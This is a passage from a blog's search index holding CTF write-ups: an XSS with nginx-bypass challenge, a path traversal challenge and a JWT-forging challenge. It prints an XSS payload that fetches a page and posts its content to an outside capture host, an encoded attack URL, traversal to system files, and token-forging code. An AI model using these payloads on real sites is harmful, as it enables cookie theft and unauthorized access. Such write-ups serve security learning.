where the challenge instance is hosted (default is http://localhost:1337) `); process.exit(1); } // visiting logic puppeteer = require(\u0026#34;puppeteer\u0026#34;); const sleep = d =\u0026gt; new Promise(r =\u0026gt; setTimeout(r, d)); const visit = async () =\u0026gt; { let browser; try { browser = await puppeteer.launch({ headless: true, pipe: true, args: [ \u0026#34;--no-sandbox\u0026#34;, \u0026#34;--disable-setuid-sandbox\u0026#34;, \u0026#34;--js-flags=--noexpose_wasm,--jitless\u0026#34;, ], dumpio: true }); const ctx = await browser.createBrowserContext(); const page = await ctx.newPage(); await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 }); await page.setCookie({ name: \u0026#39;FLAG\u0026#39;, value: \u0026#39;idek{PLACEHOLDER}\u0026#39;, httpOnly: true }); await page.goto(TARGET_URL, { timeout: 3000, waitUntil: \u0026#39;domcontentloaded\u0026#39; }); await sleep(5000); await browser.close(); browser = null; } catch (err) { console.log(err); } finally { if (browser) await browser.close(); } }; visit(); The script uses Puppeteer to:\nLaunch a headless browser. Visit a specified CHALLENGE_ORIGIN URL. Set an HTTP-only cookie named FLAG. Navigate to a TARGET_URL. Wait for 5 seconds. Close the browser. It should be noted that during the CTF, CHALLENGE_ORIGIN was set to the challenge URL. With that out of the way, it becomes very clear, that the FLAG is set as an httpOnly cookie (can\u0026rsquo;t be accessed via document.Cookie), then the bot navigates to a TARGET_URL of our choice and closes the browser.\nOur goal here is to retrieve the FLAG, but how?\nExploit Remember the info.php page we seemed to not know what it was for? Well, it turns out that phpinfo() shows all cookies, even the httponly ones, so if we can visit the /info.php page as the admin bot and retrieve its content to our local server, we will get the flag.\nNot so fast though\u0026hellip; Access to /info.php is denied by the following rule in the nginx configuration:\nl } o c a t a d i l e o l n n o y w = a 1 l / 2 l i 7 ; n . f 0 o . . 0 p . h 1 p ; { Nginx denies access to an exact location /info.php. If we navigate to something like /info.php/whatever.php, PHP-FPM processes the first php file and ignores subsequent files. This is called an HTTP Desync attack, which arises from the subtle discrepancies in which two technologies handle HTTP requests. Let\u0026rsquo;s try it out:\nThere we go! We bypassed the nginx rule, all there is left is creating an XSS payload which adheres to the constraints, visits the /info.php page and send its content to us the attacker.\nExploit - continued Before we craft the XSS payload, let\u0026rsquo;s first write the JS code which will be injected. It should look like this:\nfetch(\u0026#39;http://idek-hello.chal.idek.team:1337/info.php/whatever.php\u0026#39;) .then(response =\u0026gt; response.text()) .then(data =\u0026gt; { return fetch(\u0026#39;https://qtcbb221a681bbd53187f7c03c5c.free.beeceptor.com/save\u0026#39;, { method: \u0026#39;POST\u0026#39;, headers: { \u0026#39;Content-Type\u0026#39;: \u0026#39;application/json\u0026#39; }, body: JSON.stringify({ content: data }) }); }) The script is simple enough, we first fetch the info page, with its response captured, we send it to our hosted server (I used beeceptor to tunnel my localhost) and retrieve the flag.\nThe server in case you are wondering looks something like this (written in flask):\nfrom flask import Flask, request, jsonify app = Flask(__name__) @app.route(\u0026#39;/save\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def save(): data = request.json content = data.get(\u0026#39;content\u0026#39;, \u0026#39;\u0026#39;) # Save the content to a file with open(\u0026#39;out.html\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(content) return jsonify({\u0026#39;status\u0026#39;: \u0026#39;success\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;Content saved!\u0026#39;}) if __name__ == \u0026#39;__main__\u0026#39;: app.run(port=5000, debug=True) Alright, the last step now, how can we create the XSS payload. Let\u0026rsquo;s review the constraints:\nNo \\n No \\r No \\t No / No (space) Well that seems hard eh? we can bypass the forward slash contraint using a simple\n\u0026lt;svg onload=\u0026#34;eval(atob(\u0026#39;\u0026lt;our-base-64-javascript-code\u0026gt;\u0026#39;))\u0026#34;\u0026gt; But how about the space?\nReverting back to Wikipedia, my source of information (kudos if you get the joke), we see there exists a Form feed character (ASCII 12) - (0xC in HEX), that is considered whitespace by the C character classification function isspace().\nCool, let\u0026rsquo;s modify the payload to look like this:\n\u0026lt;svg%0Conload=\u0026#34;eval(atob(\u0026#39;\u0026lt;our-base-64-javascript-code\u0026gt;\u0026#39;))\u0026#34;\u0026gt; Lastly, to deliver the exploit, we just have to send the payload as a query parameter for name, just like this:\nhttp://idek-hello.chal.idek.team:1337/?name=\u0026lt;svg%0Conload=\u0026#34;eval(atob(\u0026#39;ZmV0Y2goJ2h0dHA6Ly9pZGVrLWhlbGxvLmNoYWwuaWRlay50ZWFtOjEzMzcvaW5mby5waHAvaW5k ZXgucGhwJykudGhlbihyPT5yLnRleHQoKSkudGhlbihkPT5mZXRjaCgnaHR0cHM6Ly9xdDFlYTY4 M2EzNjhkYzY1ZDc2YTExM2Y3NGZiLmZyZWUuYmVlY2VwdG9yLmNvbS9zYXZlJywge21ldGhvZDon UE9TVCcsaGVhZGVyczp7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSxib2R5OkpT T04uc3RyaW5naWZ5KHtjb250ZW50OmR9KX0pKQ==\u0026#39;))\u0026#34;\u0026gt; Click on submit\u0026hellip;\nThere we go~\nFlag is: idek{Ghazy_N3gm_Elbalad}\nThings learned in this challenge:\nAlways use regular expressions to match pathnames. Form feed character can be used as a whitespace inside html tags. Some scripting skills ","permalink":"https://hxuu.github.io/blog/ctf/idek24/hello/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 216 73\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='52' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='52' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='52' fill='currentColor' style='font-size:1em'\u003ef\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='52' fill='currentColor' style='font-size:1em'\u003e-\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='52' fill='currentColor' style='font-size:1em'\u003ed\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='52' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003eh\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='52' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='52' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='52' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e3\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e6\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='52' fill='currentColor' style='font-size:1em'\u003eA\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='52' fill='currentColor' style='font-size:1em'\u003eu\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='52' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='52' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'\u003ex\u003c/text\u003e\n\u003ctext text-anchor='middle' x='120' y='52' fill='currentColor' style='font-size:1em'\u003e7\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='128' y='52' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'\u003el\u003c/text\u003e\n\u003ctext text-anchor='middle' x='136' y='52' fill='currentColor' style='font-size:1em'\u003eh\u003c/text\u003e\n\u003ctext text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='144' y='52' fill='currentColor' style='font-size:1em'\u003e,\u003c/text\u003e\n\u003ctext text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='160' y='52' fill='currentColor' style='font-size:1em'\u003e2\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='168' y='52' fill='currentColor' style='font-size:1em'\u003e0\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='176' y='52' fill='currentColor' style='font-size:1em'\u003e2\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='184' y='52' fill='currentColor' style='font-size:1em'\u003e4\u003c/text\u003e\n\u003ctext text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eJust to warm you up for the next Fight :\u0026ldquo;D\u003c/p\u003e","title":"IdekCTF 24 - Hello"},{"content":"Challenge Description n c p a a o m t i e e n : g t o s t r : r y a : 1 v 2 e w 3 r e s b e d I made this website! you can\u0026rsquo;t see anything else though\u0026hellip; right?? URL: http://litctf.org:31778/\nSolution Based on the name of the challenge, I can feel a path traversal vulnerability looming around lol, anyway, let\u0026rsquo;s check the website:\nAs we can see, nothing is in the page, the hint though lies within the url bar, let\u0026rsquo;s check if can traverse the the filesystem and reveal the contents of /etc/passwd.\nWe got nothing, but that\u0026rsquo;s only because we used a dot, The server might be configured to decode URL-encoded paths before processing them, so let\u0026rsquo;s try again, with the url-encded version of . that is %2e.\nNoice, we have arbitrary file read, we can also traverse the filesystem, but what we don\u0026rsquo;t have is the flag name and location. Guessing that the flag would be in the same directory the current process is running at, and that the name well may be flag.txt. I used the /proc/self/cwd which is a symbolic link that points to the current working directory of the process accessing it, to extract the file flag.txt using something like this:\n\u0026lt;traversing-up-the-file-system\u0026gt;/proc/self/cwd/flag.txt flag is: LITCTF{backtr@ked_230fim0}\nThings learned from this challenge\nPath traversal with url encoded path use the /proc directory to get information about processes ","permalink":"https://hxuu.github.io/blog/ctf/lit24/traversed/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 128 57\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003ev\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e2\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e3\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='4' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='4' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003ctext text-anchor='middle' x='104' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='112' y='4' fill='currentColor' style='font-size:1em'\u003ed\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eI made this website! you can\u0026rsquo;t see anything else though\u0026hellip; right?? URL: \u003ca href=\"http://litctf.org:31778/\"\u003ehttp://litctf.org:31778/\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eBased on the name of the challenge, I can feel a path traversal vulnerability looming around\nlol, anyway, let\u0026rsquo;s check the website:\u003c/p\u003e","title":"LITCTF24 - Traversed"},{"content":"Challenge Description n c p a a o m t i e e n : g t o s j r : w y t : 1 - 1 2 w 7 e b its like jwt-1 but this one is harder URL: http://litctf.org:31777/\nSolution The description is very clear, the vulnerability should be in how the signature is handled, but instead of no verification at all, we should expect something harder this time.\nMy first hunch tells me to brute force the key used to generate the jwt token, but we\u0026rsquo;re actually given the source code.\nimport express from \u0026#34;express\u0026#34;; import cookieParser from \u0026#34;cookie-parser\u0026#34;; import path from \u0026#34;path\u0026#34;; import fs from \u0026#34;fs\u0026#34;; import crypto from \u0026#34;crypto\u0026#34;; const accounts: [string, string][] = []; const jwtSecret = \u0026#34;xook\u0026#34;; const jwtHeader = Buffer.from( JSON.stringify({ alg: \u0026#34;HS256\u0026#34;, typ: \u0026#34;JWT\u0026#34; }), \u0026#34;utf-8\u0026#34; ) .toString(\u0026#34;base64\u0026#34;) .replace(/=/g, \u0026#34;\u0026#34;); const sign = (payload: object) =\u0026gt; { const jwtPayload = Buffer.from(JSON.stringify(payload), \u0026#34;utf-8\u0026#34;) .toString(\u0026#34;base64\u0026#34;) .replace(/=/g, \u0026#34;\u0026#34;); const signature = crypto.createHmac(\u0026#39;sha256\u0026#39;, jwtSecret).update(jwtHeader + \u0026#39;.\u0026#39; + jwtPayload).digest(\u0026#39;base64\u0026#39;).replace(/=/g, \u0026#39;\u0026#39;); return jwtHeader + \u0026#34;.\u0026#34; + jwtPayload + \u0026#34;.\u0026#34; + signature; } const app = express(); const port = process.env.PORT || 3000; app.listen(port, () =\u0026gt; console.log(\u0026#34;server up on http://localhost:\u0026#34; + port.toString()) ); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.use(express.static(path.join(__dirname, \u0026#34;site\u0026#34;))); app.get(\u0026#34;/flag\u0026#34;, (req, res) =\u0026gt; { if (!req.cookies.token) { console.log(\u0026#39;no auth\u0026#39;) return res.status(403).send(\u0026#34;Unauthorized\u0026#34;); } try { const token = req.cookies.token; // split up token const [header, payload, signature] = token.split(\u0026#34;.\u0026#34;); if (!header || !payload || !signature) { return res.status(403).send(\u0026#34;Unauthorized\u0026#34;); } Buffer.from(header, \u0026#34;base64\u0026#34;).toString(); // decode payload const decodedPayload = Buffer.from(payload, \u0026#34;base64\u0026#34;).toString(); // parse payload const parsedPayload = JSON.parse(decodedPayload); // verify signature const expectedSignature = crypto.createHmac(\u0026#39;sha256\u0026#39;, jwtSecret).update(header + \u0026#39;.\u0026#39; + payload).digest(\u0026#39;base64\u0026#39;).replace(/=/g, \u0026#39;\u0026#39;); if (signature !== expectedSignature) { return res.status(403).send(\u0026#39;Unauthorized ;)\u0026#39;); } // check if user is admin if (parsedPayload.admin || !(\u0026#34;name\u0026#34; in parsedPayload)) { return res.send( fs.readFileSync(path.join(__dirname, \u0026#34;flag.txt\u0026#34;), \u0026#34;utf-8\u0026#34;) ); } else { return res.status(403).send(\u0026#34;Unauthorized\u0026#34;); } } catch { return res.status(403).send(\u0026#34;Unauthorized\u0026#34;); } }); app.post(\u0026#34;/login\u0026#34;, (req, res) =\u0026gt; { try { const { username, password } = req.body; if (!username || !password) { return res.status(400).send(\u0026#34;Bad Request\u0026#34;); } if ( accounts.find( (account) =\u0026gt; account[0] === username \u0026amp;\u0026amp; account[1] === password ) ) { const token = sign({ name: username, admin: false }); res.cookie(\u0026#34;token\u0026#34;, token); return res.redirect(\u0026#34;/\u0026#34;); } else { return res.status(403).send(\u0026#34;Account not found\u0026#34;); } } catch { return res.status(400).send(\u0026#34;Bad Request\u0026#34;); } }); app.post(\u0026#39;/signup\u0026#39;, (req, res) =\u0026gt; { try { const { username, password } = req.body; if (!username || !password) { return res.status(400).send(\u0026#39;Bad Request\u0026#39;); } if (accounts.find(account =\u0026gt; account[0] === username)) { return res.status(400).send(\u0026#39;Bad Request\u0026#39;); } accounts.push([username, password]); const token = sign({ name: username, admin: false }); res.cookie(\u0026#39;token\u0026#39;, token); return res.redirect(\u0026#39;/\u0026#39;); } catch { return res.status(400).send(\u0026#39;Bad Request\u0026#39;); } }); The code creates a JWT-based authentication system using a fixed secret key (jwtSecret = \u0026quot;xook\u0026quot;) to sign tokens.\nKey Use: The key \u0026quot;xook\u0026quot; is used in HMAC SHA-256 to create a signature for the JWT. This signature ensures that the token\u0026rsquo;s integrity can be verified when it\u0026rsquo;s received. If the JWT signature doesn\u0026rsquo;t match the expected signature (generated using the same key), access is denied. So as you can see, the key is given to us, we just need to extract the code that creates a valid jwt token from the latter source code, supply the username we used to access the website, and admin set to True. The code that does that would look something like this:\nconst crypto = require(\u0026#39;crypto\u0026#39;) // Define the secret key used in signing const jwtSecret = \u0026#34;xook\u0026#34;; // Function to generate JWT const sign = (payload) =\u0026gt; { // Encode the payload to base64 const jwtPayload = Buffer.from(JSON.stringify(payload), \u0026#34;utf-8\u0026#34;) .toString(\u0026#34;base64\u0026#34;) .replace(/=/g, \u0026#34;\u0026#34;); // Create the JWT header (in base64 format without \u0026#39;=\u0026#39;) const header = Buffer.from( JSON.stringify({ alg: \u0026#34;HS256\u0026#34;, typ: \u0026#34;JWT\u0026#34; }), \u0026#34;utf-8\u0026#34; ) .toString(\u0026#34;base64\u0026#34;) .replace(/=/g, \u0026#34;\u0026#34;); // Generate the HMAC SHA-256 signature const signature = crypto.createHmac(\u0026#39;sha256\u0026#39;, jwtSecret) .update(header + \u0026#39;.\u0026#39; + jwtPayload) .digest(\u0026#39;base64\u0026#39;) .replace(/=/g, \u0026#39;\u0026#39;); // Return the full JWT token return header + \u0026#34;.\u0026#34; + jwtPayload + \u0026#34;.\u0026#34; + signature; } // Test payload const testPayload = { username: \u0026#34;hxuu\u0026#34;, admin: true }; // Generate a token const token = sign(testPayload); // Output the generated token console.log(\u0026#34;Generated JWT Token:\u0026#34;, token); Running the code above gives a valid token. We just have to replace the cookies given by the application by our newly crafted token, and then pressing GET FLAG.\nflag is: LITCTF{v3rifyed_thI3_Tlme_1re4DV9}\nThings learned:\nhow to weak key can result into compromising jwt tokens ","permalink":"https://hxuu.github.io/blog/ctf/lit24/jwt-2/","summary":"\u003ch2 id=\"challenge-description\"\u003eChallenge Description\u003c/h2\u003e\n\n\n\n\u003cdiv class=\"goat svg-container \"\u003e\n  \n    \u003csvg\n      xmlns=\"http://www.w3.org/2000/svg\"\n      font-family=\"Menlo,Lucida Console,monospace\"\n      \n        viewBox=\"0 0 112 57\"\n      \u003e\n      \u003cg transform='translate(8,16)'\u003e\n\u003ctext text-anchor='middle' x='0' y='4' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='20' fill='currentColor' style='font-size:1em'\u003ec\u003c/text\u003e\n\u003ctext text-anchor='middle' x='0' y='36' fill='currentColor' style='font-size:1em'\u003ep\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='4' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='20' fill='currentColor' style='font-size:1em'\u003ea\u003c/text\u003e\n\u003ctext text-anchor='middle' x='8' y='36' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='4' fill='currentColor' style='font-size:1em'\u003em\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='20' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='16' y='36' fill='currentColor' style='font-size:1em'\u003ei\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='4' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='24' y='36' fill='currentColor' style='font-size:1em'\u003en\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='4' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='20' fill='currentColor' style='font-size:1em'\u003eg\u003c/text\u003e\n\u003ctext text-anchor='middle' x='32' y='36' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='20' fill='currentColor' style='font-size:1em'\u003eo\u003c/text\u003e\n\u003ctext text-anchor='middle' x='40' y='36' fill='currentColor' style='font-size:1em'\u003es\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='4' fill='currentColor' style='font-size:1em'\u003ej\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='20' fill='currentColor' style='font-size:1em'\u003er\u003c/text\u003e\n\u003ctext text-anchor='middle' x='48' y='36' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='4' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='56' y='20' fill='currentColor' style='font-size:1em'\u003ey\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='4' fill='currentColor' style='font-size:1em'\u003et\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='20' fill='currentColor' style='font-size:1em'\u003e:\u003c/text\u003e\n\u003ctext text-anchor='middle' x='64' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='4' fill='currentColor' style='font-size:1em'\u003e-\u003c/text\u003e\n\u003ctext text-anchor='middle' x='72' y='36' fill='currentColor' style='font-size:1em'\u003e1\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='4' fill='currentColor' style='font-size:1em'\u003e2\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='20' fill='currentColor' style='font-size:1em'\u003ew\u003c/text\u003e\n\u003ctext text-anchor='middle' x='80' y='36' fill='currentColor' style='font-size:1em'\u003e7\u003c/text\u003e\n\u003ctext text-anchor='middle' x='88' y='20' fill='currentColor' style='font-size:1em'\u003ee\u003c/text\u003e\n\u003ctext text-anchor='middle' x='96' y='20' fill='currentColor' style='font-size:1em'\u003eb\u003c/text\u003e\n\u003c/g\u003e\n\n    \u003c/svg\u003e\n  \n\u003c/div\u003e\n\u003cp\u003eits like jwt-1 but this one is harder URL: \u003ca href=\"http://litctf.org:31777/\"\u003ehttp://litctf.org:31777/\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"solution\"\u003eSolution\u003c/h2\u003e\n\u003cp\u003eThe description is very clear, the vulnerability should be in how the signature\nis handled, but 